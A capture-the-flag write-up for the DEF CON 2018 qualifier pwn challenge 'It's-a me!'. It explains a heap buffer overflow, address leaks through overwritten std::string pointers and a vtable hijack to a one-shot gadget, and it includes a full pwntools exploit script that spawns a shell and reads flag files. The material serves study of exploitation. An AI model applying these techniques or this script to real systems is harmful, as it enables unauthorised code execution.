# Writeup for It's-a me! (pwn, 124 pts, 49 solves), DEF CON CTF Qualifier 2018

## TL;DR

- Buffer overflow on the heap

- Overwrite a `std::string`'s buffer pointer to leak binary's and libc's base

- Overwrite a vtable pointer to call a one-shot gadget and get a shell

## The Challenge

The service allows us to login as different customers and order pizza. When ordering a pizza, ingredients are accepted as UTF-8 encoded emojis (e.g. 🍅 and 🍍). If we try to put a pineapple on our pizza, the shop owner gets angry and throws us out. We can also cook ordered pizzas and admire all cooked pizzas
When we manage to sneak a pineapple on our pizza, we have a final chance to explain our reasoning to the shop owner before he throws us out; however, every explanation leads to us getting thrown out.

The ingredients are stored in a `std::vector` of `std::string`s and the cooked pizzas are stored as C++ objects, all on the heap.

## The Bug

The pineapple-check while ordering the pizza is performed for each ingredient individually, but the check when cooking the pizza is performed on all ingredients concatenated. By splitting the pineapple (which is encoded in four bytes) into two adjacent ingredients, we can sneak a pineapple onto the cooked pizza.

The final explanation we can give to the shop owner is vulnerable to a buffer overflow: up to 300 bytes are read into a heap chunk, which was previously allocated to exactly fit some user input.

## The Exploit

Using the buffer overflow, we can overwrite pointers on the heap, both to leak information and control the execution flow.

### Leak

First we want to leak the base address of the binary and the libc, by overwriting the buffer pointer of an ingredient and then cooking a pizza using that ingredient. To get the overflowing buffer in front of an ingredient's `std::string` requires a large amount of heap massaging, but can be done by ordering and cooking pizzas in a specific way.

Since we initially don't know any addresses, the first overflow partially modifies the `std::string`'s buffer pointer to point to a pizza's vtable pointer. This step also requires a bit of heap shaping, since the second least significant byte of the buffer pointer will be overwritten with a null byte; this null byte also prevents the exploit from working every time, since it requires the heap address to end in `0xe000` (it has a 1/16 chance of succeeding). By leaking the pizza's vtable pointer, we can calculate the base address of the binary.

After we have the binary's address, we trigger the bug again (after some heap massaging), to overwrite a `std::string`'s buffer pointer with the address of one of the binary's GOT entries. By now cooking the pizza, we leak this entry and calculate the base address of libc.

### Code Execution

After having leaked all required addresses, we want to control the execution flow. To do this we arrange a pizza object after the overflowing buffer and overwrite its vtable pointer, so that it points to a user-controlled buffer in the binary's .data segment. We place the address of a one-shot gadget in this buffer, trigger a vtable call by admiring the pizza, and pop a shell.

Flag: `OOO{cr1m1n4l5_5h0uld_n07_b3_r3w4rd3d_w17h_fl4gs}`

## Exploit Code

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

from pow import solve_pow

pineapple = u'🍍'.encode('utf-8')
tomato = u'🍅'.encode('utf-8')
illegal = [chr(0b11100000) + pineapple[:2], pineapple[2:] + 'A' * 15]

name_buf = 0x20c5e0
magic = 0xf02a4

binary = ELF('./mario')
libc = ELF('./libc.so.6')

context.binary = binary


def exploit():
    do_connect()

    # ----- leak binary -----

    create_user('bad')
    order(illegal)
    logout()

    create_user('good')
    order([tomato])
    cook('A' * 0x32)
    order(['A' * 0x12, 'A' * 0x12])
    logout()

    login('bad')
    cook('B' * 0x12)
    explain(flat('B' * 0x18, 0x21, 0, 'B' * 0x10, 0x51) + '\x11')

    login('good')
    cook('A')

    g.recvuntil('PIZZA #2')
    g.recvuntil('Adding ingredient: ')
    leak = u64(('\0' + g.recvuntil('\nAdding ingredient', drop=True)).ljust(8, '\0'))
    if leak:
        info("leak: 0x%x", leak)
        binary.address = leak - 0x20bc00
    else:
        g.close()
        warning("Exploit failed, trying again")
        return

    # ----- leak libc -----

    logout()
    create_user('bad2')
    order(illegal)
    logout()

    create_user('good2')
    order([tomato])
    cook('A' * 0x32)
    order(['A' * 0x12, 'A' * 0x12])
    logout()

    login('bad2')
    cook('B' * 0x12)
    explain(flat('B' * 0x18, 0x21, 0, 'B' * 0x10, 0x51, binary.got.puts, 0x12, 0x12))

    login('good2')
    cook('A')

    g.recvuntil('PIZZA #2')
    g.recvuntil('Adding ingredient: ')
    leak = u64(g.recvuntil('\nAdding ingredient', drop=True).ljust(8, '\0'))
    info("leak: 0x%x", leak)
    libc.address = leak - libc.symbols.puts

    # ----- fake vtable -----

    payload = p64(libc.address + magic)

    logout()
    create_user('user2')
    order(illegal)
    logout()

    create_user(payload)
    order([tomato, 'A' * 0x12, 'A' * 0x12])
    cook('A' * 0x37)
    cook('A')
    logout()

    login('user2')
    cook('B' * 0x67)
    explain('C' * 0x70 + p64(binary.address + name_buf))

    login(payload)
    admire()

    sleep(1)
    g.sendline('id;pwd;ls -al;cat fl* /home/*/fl*')
    g.interactive()
    exit()


def explain(msg):
    g.sendlineafter('Choice: ', 'P')
    g.sendlineafter('yourself: ', msg)


def cook(msg):
    g.sendlineafter('Choice: ', 'C')
    g.sendlineafter('explain: ', msg)


def order(ingredients):
    g.sendlineafter('Choice: ', 'O')
    g.sendlineafter('pizzas? ', '1')
    g.sendlineafter('ingredients? ', str(len(ingredients)))
    for i, ingredient in enumerate(ingredients, 1):
        g.sendlineafter('#%d: ' % i, ingredient)


def admire():
    g.sendlineafter('Choice: ', 'A')


def login(name):
    g.sendlineafter('Choice: ', 'L')
    g.sendlineafter('name? ', name)


def logout():
    g.sendlineafter('Choice: ', 'L')


def create_user(name):
    g.sendlineafter('Choice: ', 'N')
    g.sendlineafter('name? ', name)


def do_connect():
    global g
    if args.REMOTE:
        g = connect('83b1db91.quals2018.oooverflow.io', 31337)
        do_pow()
    else:
        g = process('./mario')


def do_pow():
    g.recvuntil('Challenge: ')
    chall = g.recvuntil('\nn: ', drop=True)
    n = int(g.recvuntil('\nSolution: \n', drop=True))
    info("Computing POW: %r, %d", chall, n)
    g.sendline(str(solve_pow(chall, n)))


if __name__ == '__main__':
    while True:
        exploit()

```
